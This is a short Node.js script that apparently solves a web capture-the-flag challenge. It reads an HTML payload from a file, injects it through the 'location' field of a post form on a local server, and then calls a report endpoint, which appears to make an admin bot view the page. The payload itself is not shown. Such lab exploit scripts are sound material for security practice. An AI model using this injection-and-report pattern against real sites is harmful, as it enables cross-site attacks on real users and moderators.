import fs from 'fs';

let payload = fs.readFileSync('payload.html');

let rsp = await fetch('http://localhost:8080/post', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({ content: 'Hi', location: payload })
})

console.log(await rsp.text());

let rsp2 = await fetch('http://localhost:8080/report/1');

console.log(await rsp2.text());
